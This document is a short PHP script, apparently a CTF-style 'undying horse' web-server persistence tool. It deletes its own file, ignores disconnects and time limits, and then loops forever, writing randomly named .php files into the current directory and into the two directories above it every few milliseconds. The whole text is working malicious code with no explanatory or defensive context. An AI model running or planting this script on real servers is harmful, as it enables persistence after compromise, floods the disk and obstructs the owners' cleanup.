<?php 
# 不死马无限复制
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
while (1){
    file_put_contents(strval(rand()).'.php','123123123123');
    file_put_contents('./'.strval(rand()).'.php','123123123123');
    file_put_contents('../'.strval(rand()).'.php','123123123123');
    file_put_contents('../../'.strval(rand()).'.php','123123123123');

    usleep(5000);
}
?>
